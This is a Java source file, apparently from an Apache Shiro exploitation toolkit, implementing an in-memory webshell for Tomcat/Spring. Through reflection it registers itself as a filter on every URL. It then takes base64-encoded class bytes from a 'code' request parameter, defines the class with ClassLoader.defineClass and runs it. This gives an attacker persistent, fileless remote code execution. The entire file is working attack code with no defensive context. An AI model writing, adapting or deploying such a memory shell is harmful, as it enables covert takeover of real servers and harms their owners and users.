package com.sma11new.exp.shiro.attack.shell;

import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EnumSet;
import java.util.UUID;

public class ClassLoaderFilter implements Filter {

    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";

    public ClassLoaderFilter() {
        // only spring
        org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
        request = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
        response = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
        addFilter();
    }

    private void addFilter() {
        try {
            ServletContext servletContext = this.request.getServletContext();
            Field contextField = null;
            ApplicationContext applicationContext = null;
            StandardContext standardContext = null;

            Field stateField = LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            try {
                contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (ApplicationContext) contextField.get(servletContext);
                contextField = applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext = (StandardContext) contextField.get(applicationContext);

                stateField.set(standardContext, LifecycleState.STARTING_PREP);

                servletContext
                        .addFilter(UUID.randomUUID().toString(), this)
                        .addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, "/*");

                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext);

                stateField.set(standardContext, LifecycleState.STARTED);
            } finally {
                stateField.set(standardContext, LifecycleState.STARTED);
            }

            StringBuffer output = new StringBuffer();
            String tag_s = "->|";
            String tag_e = "|<-";
            output.append(tag_s);

            try {
                this.response.setContentType("text/html");
                this.request.setCharacterEncoding(this.cs);
                this.response.setCharacterEncoding(this.cs);
                output.append("Success");
            } catch (Exception var7) {
                output.append("error:" + var7.toString());
            }

            output.append(tag_e);

            try {
                this.response.getWriter().print(output.toString());
                this.response.getWriter().flush();
                this.response.getWriter().close();
            } catch (Exception var6) {}
        } catch (Exception var5) {}
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
        String enable = request.getParameter("enable");
        String base64Code = request.getParameter("code");
        System.out.println("start inject class: " + enable + " " + base64Code);
        if (enable != null && base64Code != null && !base64Code.isEmpty()) {
            try {
                byte[] classBytes = java.util.Base64.getDecoder().decode(base64Code);
                java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                defineClassMethod.setAccessible(true);
                Object[] objs = new Object[]{request, response};
                ((Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{classBytes, new Integer(0), new Integer(classBytes.length)})).newInstance().equals(objs);
            } catch (Exception e) {}
            return;
        }
        filterChain.doFilter(request, response);
    }

    @Override
    public void destroy() {

    }
}